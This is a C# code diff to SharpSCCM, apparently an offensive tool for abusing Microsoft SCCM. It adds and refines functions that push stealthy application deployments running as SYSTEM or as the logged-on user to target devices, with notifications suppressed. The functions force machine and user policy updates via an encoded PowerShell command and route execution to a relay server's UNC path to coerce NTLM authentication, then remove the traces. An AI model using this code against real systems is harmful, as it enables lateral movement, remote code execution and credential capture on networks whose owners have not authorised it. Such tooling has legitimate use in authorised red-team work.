@@ -2,6 +2,7 @@
 using System.Data;
 using System.Linq;
 using System.Management;
+using System.Runtime.Versioning;
 using System.Threading;
 
 namespace SharpSCCM
@@ -42,7 +43,7 @@ namespace SharpSCCM
             return collection;
         }
 
-        public static ManagementObjectCollection GetCollectionMember(ManagementScope wmiConnection, string collectionName = null, string collectionId = null, string[] properties = null, bool dryRun = false, bool verbose = false, bool printOutput = true)
+        public static ManagementObjectCollection GetCollectionMember(ManagementScope wmiConnection, string collectionName = null, string collectionId = null, string[] properties = null, bool dryRun = false, bool verbose = false, bool printOutput = false)
         {
             ManagementObjectCollection collectionMembers = null;
             ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId, printOutput);
@@ -51,7 +52,7 @@ namespace SharpSCCM
                 collectionMembers = MgmtUtil.GetClassInstances(wmiConnection, "SMS_CollectionMember_a", null, false, properties, $"CollectionID='{collection.GetPropertyValue("CollectionID")}'", null, dryRun, verbose, printOutput: printOutput);
                 if (collectionMembers.Count == 0)
                 {
-                    Console.WriteLine(value: "[+] Found 0 members in the specified collection");
+                    Console.WriteLine($"[+] Found 0 members in {collection["Name"]} ({collection["CollectionID"]})");
                 }
             }
             return collectionMembers;
@@ -169,6 +170,32 @@ namespace SharpSCCM
             }
         }
 
+        public static ManagementObjectCollection GetPrimaryUserDevices(ManagementScope wmiConnection, string resourceId = null, string userName = null)
+        {
+            string whereCondition = !string.IsNullOrEmpty(resourceId) ? $"ResourceID='{resourceId}'" : $"UniqueUserName='{userName}'";
+            // Get the device associated with the user
+            ManagementObjectCollection userDevices = MgmtUtil.GetClassInstances(wmiConnection, "SMS_UserMachineRelationship", whereCondition: whereCondition);
+            if (userDevices.Count == 1)
+            {
+                Console.WriteLine($"[+] {userName} is the primary user of {userDevices.OfType<ManagementObject>().First()["ResourceName"]}");
+            }
+            else if (userDevices.Count > 1)
+            {
+                Console.WriteLine($"[!] Found multiple devices where {userName} is the primary user:\n");
+                foreach (ManagementObject userDevice in userDevices)
+                {
+                    Console.WriteLine($"    {userDevice["ResourceName"]}");
+                }
+                Console.WriteLine();
+                Console.WriteLine("[!] Try again using the device Name (-d) or ResourceID (-r)");
+            }
+            else
+            {
+                Console.WriteLine($"[!] Could not find any devices where {userName} is the primary user");
+            }
+            return userDevices;
+        }
+
         public static void GetSitePushSettings(ManagementScope wmiConnection = null)
         {
             ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery($"SELECT PropertyName, Value, Value1 FROM SMS_SCI_SCProperty WHERE ItemType='SMS_DISCOVERY_DATA_MANAGER' AND (PropertyName='ENABLEKERBEROSCHECK' OR PropertyName='FILTERS' OR PropertyName='SETTINGS')"));
@@ -279,21 +306,41 @@ namespace SharpSCCM
                 collectionType = !string.IsNullOrEmpty(deviceName) ? "device" : !string.IsNullOrEmpty(userName) ? "user" : collectionType;
                 string newCollectionName = !string.IsNullOrEmpty(deviceName) ? $"Devices_{Guid.NewGuid()}" : !string.IsNullOrEmpty(userName) ? $"Users_{Guid.NewGuid()}" : null;
                 collection = NewCollection(wmiConnection, collectionType, newCollectionName);
-                NewCollectionMember(wmiConnection, newCollectionName, collectionType, (string)collection["CollectionID"], deviceName, userName);
+                NewCollectionMember(wmiConnection, newCollectionName, collectionType, (string)collection["CollectionID"], deviceName, userName, resourceId);
             }
             string newApplicationName = $"Application_{Guid.NewGuid()}";
+            string newDeploymentName = $"{newApplicationName}_{(string)collection["CollectionID"]}_Install";
             applicationPath = !string.IsNullOrEmpty(relayServer) ? $"\\\\{relayServer}\\C$" : applicationPath;
             NewApplication(wmiConnection, newApplicationName, applicationPath, runAsUser, true);
             NewDeployment(wmiConnection, newApplicationName, null, (string)collection["CollectionID"]);
-            Console.WriteLine("[+] Waiting 30s for new deployment to become available");
-            Thread.Sleep(30000);
-            InvokeUpdate(wmiConnection, (string)collection["Name"]);
-            Console.WriteLine("[+] Waiting 1m for NTLM authentication");
+            Console.WriteLine("[+] Waiting for new deployment to become available...");
+            bool deploymentAvailable = false;
+            while (!deploymentAvailable)
+            {
+                Thread.Sleep(millisecondsTimeout: 5000);
+                ManagementObjectCollection deployments = MgmtUtil.GetClassInstances(wmiConnection, "SMS_ApplicationAssignment", whereCondition: $"AssignmentName='{newDeploymentName}'");
+                if (deployments.Count == 1)
+                {
+                    Console.WriteLine("[+] New deployment is available, waiting 30 seconds for updated machine policy to become available");
+                    Thread.Sleep(millisecondsTimeout: 30000);
+                    deploymentAvailable = true;
+                }
+                else
+                {
+                    Console.WriteLine("[+] New deployment is not available yet... trying again in 5 seconds");
+                }
+            }
+            UpdateMachinePolicy(wmiConnection, (string)collection["CollectionID"]);
+            Console.WriteLine("[+] Waiting 1 minute for execution to complete...");
             Thread.Sleep(60000);
             Console.WriteLine("[+] Cleaning up");
-            Cleanup.RemoveDeployment(wmiConnection, $"{newApplicationName}_{(string)collection["Name"]}_Install");
+            Cleanup.RemoveDeployment(wmiConnection, newDeploymentName);
             Cleanup.RemoveApplication(wmiConnection, newApplicationName);
-            Cleanup.RemoveCollection(wmiConnection, (string)collection["Name"], null);
+            // Only delete the collection if not using an existing collection
+            if (string.IsNullOrEmpty(collectionId) && string.IsNullOrEmpty(collectionName))
+            {
+                Cleanup.RemoveCollection(wmiConnection, null, (string)collection["CollectionID"]);
+            }
         }
         
         public static void InvokeLastLogonUpdate(ManagementScope wmiConnection, string collectionName)
@@ -301,18 +348,15 @@ namespace SharpSCCM
             // TODO
         }
 
-        public static void InvokeUpdate(ManagementScope wmiConnection, string collectionName)
+        public static void UpdateMachinePolicy(ManagementScope wmiConnection, string collectionId = null, string collectionName = null)
         {
-            Console.WriteLine($"[+] Forcing all members of {collectionName} to check for updates and execute any new applications available");
             ManagementClass clientOperation = new ManagementClass(wmiConnection, new ManagementPath("SMS_ClientOperation"), null);
             ManagementBaseObject initiateClientOpParams = clientOperation.GetMethodParameters("InitiateClientOperation");
             initiateClientOpParams.SetPropertyValue("Type", 8); // RequestPolicyNow
 
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collectionName}'"));
-            foreach (ManagementObject collection in searcher.Get())
-            {
-                initiateClientOpParams["TargetCollectionID"] = collection.GetPropertyValue("CollectionID");
-            }
+            ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId);
+            initiateClientOpParams["TargetCollectionID"] = collection["CollectionID"];
+            Console.WriteLine($"[+] Forcing all members of {collection["Name"]} ({collection["CollectionID"]}) to check for updates to machine policy and execute any new applications available");
             try
             {
                 clientOperation.InvokeMethod("InitiateClientOperation", initiateClientOpParams, null);
@@ -324,21 +368,40 @@ namespace SharpSCCM
             }
         }
 
-        public static void NewApplication(ManagementScope wmiConnection, string name, string path, bool runAsUser = false, bool stealth = false)
+        public static void UpdateUserPolicy(ManagementScope wmiConnection, string collectionId = null, string collectionName = null, string deviceName = null, string resourceId = null, string userName = null)
         {
+            if (!string.IsNullOrEmpty(collectionId) || !string.IsNullOrEmpty(collectionName))
+            {
+                ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId);
+                Console.WriteLine($"[+] Forcing all members of {collection["Name"]} ({collection["CollectionID"]}) to check for updates to user policy and execute any new applications available");
+            }
+            string collectionType = null;
+            if (!string.IsNullOrEmpty(resourceId) || !string.IsNullOrEmpty(userName))
+            {
+                ManagementObject userDevice = GetPrimaryUserDevices(wmiConnection, resourceId, userName).OfType<ManagementObject>().First();
+                Console.WriteLine($"[+] Forcing {userDevice["ResourceName"]} ({userDevice["ResourceID"]}) to check for updates to user policy and execute any new applications available for {userDevice["UniqueUserName"]}");
+                deviceName = userDevice["ResourceName"].ToString();
+                collectionType = "device";
+            }
+            // $CurrentUser = Get-WmiObject -Query "SELECT UserSID, LogoffTime FROM CCM_UserLogonEvents WHERE LogoffTime=NULL" -Namespace "root\ccm"; $UserID=$CurrentUser.UserSID; $UserID=$UserID.replace("-", "_"); $MessageIDs = "{00000000-0000-0000-0000-000000000026}","{00000000-0000-0000-0000-000000000027}"; ForEach ($MessageID in $MessageIDs) { $ScheduledMessage = ([wmi]"root\ccm\Policy\$UserID\ActualConfig:CCM_Scheduler_ScheduledMessage.ScheduledMessageID=$MessageID"); $ScheduledMessage.Triggers = @("SimpleInterval;Minutes=1;MaxRandomDelayMinutes=0"); $ScheduledMessage.TargetEndpoint = "direct:PolicyAgent_RequestAssignments"; $ScheduledMessage.Put(); $ScheduledMessage.Triggers = @("SimpleInterval;Minutes=15;MaxRandomDelayMinutes=0"); sleep 30; $ScheduledMessage.Put()}
+            string commandToExecute = "powershell -EncodedCommand JABDAHUAcgByAGUAbgB0AFUAcwBlAHIAIAA9ACAARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AUQB1AGUAcgB5ACAAIgBTAEUATABFAEMAVAAgAFUAcwBlAHIAUwBJAEQALAAgAEwAbwBnAG8AZgBmAFQAaQBtAGUAIABGAFIATwBNACAAQwBDAE0AXwBVAHMAZQByAEwAbwBnAG8AbgBFAHYAZQBuAHQAcwAgAFcASABFAFIARQAgAEwAbwBnAG8AZgBmAFQAaQBtAGUAPQBOAFUATABMACIAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAIgByAG8AbwB0AFwAYwBjAG0AIgA7ACAAJABVAHMAZQByAEkARAA9ACQAQwB1AHIAcgBlAG4AdABVAHMAZQByAC4AVQBzAGUAcgBTAEkARAA7ACAAJABVAHMAZQByAEkARAA9ACQAVQBzAGUAcgBJAEQALgByAGUAcABsAGEAYwBlACgAIgAtACIALAAgACIAXwAiACkAOwAgACQATQBlAHMAcwBhAGcAZQBJAEQAcwAgAD0AIAAiAHsAMAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAyADYAfQAiACwAIgB7ADAAMAAwADAAMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAAMAAwADAAMAAwADAAMgA3AH0AIgA7ACAARgBvAHIARQBhAGMAaAAgACgAJABNAGUAcwBzAGEAZwBlAEkARAAgAGkAbgAgACQATQBlAHMAcwBhAGcAZQBJAEQAcwApACAAewAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAgAD0AIAAoAFsAdwBtAGkAXQAiAHIAbwBvAHQAXABjAGMAbQBcAFAAbwBsAGkAYwB5AFwAJABVAHMAZQByAEkARABcAEEAYwB0AHUAYQBsAEMAbwBuAGYAaQBnADoAQwBDAE0AXwBTAGMAaABlAGQAdQBsAGUAcgBfAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBTAGMAaABlAGQAdQBsAGUAZABNAGUAcwBzAGEAZwBlAEkARAA9ACQATQBlAHMAcwBhAGcAZQBJAEQAIgApADsAIAAkAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBUAHIAaQBnAGcAZQByAHMAIAA9ACAAQAAoACIAUwBpAG0AcABsAGUASQBuAHQAZQByAHYAYQBsADsATQBpAG4AdQB0AGUAcwA9ADEAOwBNAGEAeABSAGEAbgBkAG8AbQBEAGUAbABhAHkATQBpAG4AdQB0AGUAcwA9ADAAIgApADsAIAAkAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBUAGEAcgBnAGUAdABFAG4AZABwAG8AaQBuAHQAIAA9ACAAIgBkAGkAcgBlAGMAdAA6AFAAbwBsAGkAYwB5AEEAZwBlAG4AdABfAFIAZQBxAHUAZQBzAHQAQQBzAHMAaQBnAG4AbQBlAG4AdABzACIAOwAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAuAFAAdQB0ACgAKQA7ACAAJABTAGMAaABlAGQAdQBsAGUAZABNAGUAcwBzAGEAZwBlAC4AVAByAGkAZwBnAGUAcgBzACAAPQAgAEAAKAAiAFMAaQBtAHAAbABlAEkAbgB0AGUAcgB2AGEAbAA7AE0AaQBuAHUAdABlAHMAPQAxADUAOwBNAGEAeABSAGEAbgBkAG8AbQBEAGUAbABhAHkATQBpAG4AdQB0AGUAcwA9ADAAIgApADsAIABzAGwAZQBlAHAAIAAzADAAOwAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAuAFAAdQB0ACgAKQB9AA==";
+            Exec(wmiConnection, collectionId, collectionName, deviceName, commandToExecute, null, resourceId, false, collectionType);
+        }
+
+        public static ManagementObject NewApplication(ManagementScope wmiConnection, string name, string path, bool runAsUser = false, bool stealth = false)
+        {
+            ManagementObject application = null;
+
             // Check for existing application before creating a new one
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery($"SELECT * FROM SMS_Application WHERE LocalizedDisplayName='{name}'"));
-            ManagementObjectCollection applications = searcher.Get();
+            ManagementObjectCollection applications = MgmtUtil.GetClassInstances(wmiConnection, "SMS_Application", whereCondition: $"LocalizedDisplayName='{name}'");
             if (applications.Count > 0)
             {
-                foreach (ManagementObject application in applications)
-                {
-                    Console.WriteLine($"[+] There is already an application with the name {name}");
-                }
+                Console.WriteLine($"[+] There is already an application with the name {name}");
             }
             else
             {
                 Console.WriteLine($"[+] Creating new application: {name}");
+                Console.WriteLine($"[+] Application path: {path}");
                 ManagementClass idInstance = new ManagementClass(wmiConnection, new ManagementPath("SMS_Identification"), null);
                 ManagementBaseObject outParams = idInstance.InvokeMethod("GetSiteID", null, null);
                 string siteId = outParams["SiteID"].ToString().Replace("{", "").Replace("}", "");
@@ -488,7 +551,7 @@ namespace SharpSCCM
                 //Application appInstance = SccmSerializer.DeserializeFromString(xml, true);
                 //string xmla = SccmSerializer.SerializeToString(appInstance, true);
 
-                ManagementObject application = new ManagementClass(wmiConnection, new ManagementPath("SMS_Application"), null).CreateInstance();
+                application = new ManagementClass(wmiConnection, new ManagementPath("SMS_Application"), null).CreateInstance();
                 //application["SDMPackageXML"] = xmla;
                 application["SDMPackageXML"] = xml;
                 if (stealth)
@@ -499,6 +562,10 @@ namespace SharpSCCM
                 if (runAsUser)
                 {
                     Console.WriteLine("[+] Updated application to run in the context of the logged on user");
+                }
+                else
+                {
+                    Console.WriteLine("[+] Updated application to run as SYSTEM");
                 }
                 try
                 {
@@ -519,6 +586,7 @@ namespace SharpSCCM
                     Console.WriteLine("[!] Is your account assigned the correct security role?");
                 }
             }
+            return application;
         }
 
         public static ManagementObject NewCollection(ManagementScope wmiConnection, string collectionType, string collectionName)
@@ -627,7 +695,8 @@ namespace SharpSCCM
                 }
                 else if (matchingResources.Count > 0)
                 {
-                    Console.WriteLine($"[+] Verified resource exists");
+                    ManagementObject matchingResource = matchingResources.OfType<ManagementObject>().First();
+                    Console.WriteLine($"[+] Verified {matchingResource["Name"]} ({matchingResource["ResourceID"]}) exists");
                     ManagementObject newCollectionRule = new ManagementClass(wmiConnection, new ManagementPath("SMS_CollectionRuleQuery"), null).CreateInstance();
                     newCollectionRule["QueryExpression"] = membershipQuery;
                     newCollectionRule["RuleName"] = $"{collectionType}_{Guid.NewGuid()}";
@@ -647,10 +716,23 @@ namespace SharpSCCM
                         try
                         {
                             collection.InvokeMethod("AddMembershipRule", addMembershipRuleParams, null);
-                            Console.WriteLine($"[+] Added resource to {(!string.IsNullOrEmpty(collectionName) ? collectionName : collectionId)}");
-                            Console.WriteLine($"[+] Waiting {waitTime}s for collection to populate");
-                            Thread.Sleep(waitTime * 1000);
-                            collectionMembers = GetCollectionMember(wmiConnection, collectionName, collectionId);
+                            Console.WriteLine($"[+] Added {matchingResource["Name"]} {matchingResource["ResourceID"]} to {(!string.IsNullOrEmpty(collectionName) ? collectionName : collectionId)}");
+                            Console.WriteLine($"[+] Waiting for new collection member to become available...");
+                            bool memberAvailable = false;
+                            while (!memberAvailable)
+                            {
+                                Thread.Sleep(millisecondsTimeout: 5000);
+                                collectionMembers = GetCollectionMember(wmiConnection, collectionName, collectionId);
+                                if (collectionMembers.Count == 1)
+                                {
+                                    Console.WriteLine($"[+] Successfully added {matchingResource["Name"]} {matchingResource["ResourceID"]} to {(!string.IsNullOrEmpty(collectionName) ? collectionName : collectionId)}");
+                                    memberAvailable = true;
+                                }
+                                else
+                                {
+                                    Console.WriteLine("[+] New collection member is not available yet... trying again in 5 seconds");
+                                }
+                            }
                         }
                         catch (ManagementException ex)
                         {
@@ -667,8 +749,10 @@ namespace SharpSCCM
             return collectionMembers;
         }
 
-        public static void NewDeployment(ManagementScope wmiConnection, string applicationName, string collectionName, string collectionId)
+        public static ManagementObject NewDeployment(ManagementScope wmiConnection, string applicationName, string collectionName, string collectionId)
         {
+            ManagementObject deployment = null;
+
             // Check if the collection is unique
             ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId);
             if (collection != null)
@@ -677,17 +761,17 @@ namespace SharpSCCM
                 ManagementObjectCollection deployments = MgmtUtil.GetClassInstances(wmiConnection, "SMS_ApplicationAssignment", $"SELECT * FROM SMS_ApplicationAssignment WHERE ApplicationName='{applicationName}' AND TargetCollectionID='{collection["CollectionID"]}'");
                 if (deployments.Count > 0)
                 {
-                    foreach (ManagementObject deployment in deployments)
+                    foreach (ManagementObject existingDeployment in deployments)
                     {
-                        Console.WriteLine($"[!] Application {applicationName} is already assigned to collection {collection["Name"]} ({collection["CollectionID"]}) in deployment {deployment["AssignmentName"]}");
+                        Console.WriteLine($"[!] Application {applicationName} is already assigned to collection {collection["Name"]} ({collection["CollectionID"]}) in deployment {existingDeployment["AssignmentName"]}");
                     }
                 }
                 else
                 {
-                    Console.WriteLine($"[+] Creating new deployment of {applicationName} to {collection["Name"]}");
+                    Console.WriteLine($"[+] Creating new deployment of {applicationName} to {collection["Name"]} ({collection["CollectionID"]})");
                     string siteCode = wmiConnection.Path.ToString().Split('_').Last();
                     string now = DateTime.Now.ToString("yyyyMMddHHmmss" + ".000000+***");
-                    ManagementObject deployment = new ManagementClass(wmiConnection, new ManagementPath("SMS_ApplicationAssignment"), null).CreateInstance();
+                    deployment = new ManagementClass(wmiConnection, new ManagementPath("SMS_ApplicationAssignment"), null).CreateInstance();
                     deployment["ApplicationName"] = applicationName;
                     deployment["AssignmentName"] = $"{applicationName}_{collection["CollectionID"]}_Install";
                     deployment["AssignmentAction"] = 2; // APPLY
@@ -698,6 +782,7 @@ namespace SharpSCCM
                     deployment["EnforcementDeadline"] = now;
                     deployment["LogComplianceToWinEvent"] = false;
                     deployment["NotifyUser"] = false;
+                    deployment["OfferFlags"] = 1; // PREDEPLOY
                     deployment["OfferTypeID"] = 0; // REQUIRED
                     deployment["OverrideServiceWindows"] = true;
                     deployment["Priority"] = 2; // HIGH
@@ -708,8 +793,10 @@ namespace SharpSCCM
                     deployment["SuppressReboot"] = 0;
                     deployment["TargetCollectionID"] = collection["CollectionID"];
                     deployment["UseGMTTimes"] = true;
-                    deployment["UserUIExperience"] = false; // Do not display user notifications
-                    deployment["WoLEnabled"] = false; // Not including this one results in errors displayed in the console
+                    // Do not display user notifications
+                    deployment["UserUIExperience"] = false;
+                    // Not including this property results in errors displayed in the console
+                    deployment["WoLEnabled"] = false; 
 
                     ManagementObjectCollection applications = MgmtUtil.GetClassInstances(wmiConnection, "SMS_Application", $"SELECT * FROM SMS_Application WHERE LocalizedDisplayName='{applicationName}'");
                     if (applications.Count == 1)
@@ -747,6 +834,7 @@ namespace SharpSCCM
                     }
                 }
             }
+            return deployment;
         }
     }
 }
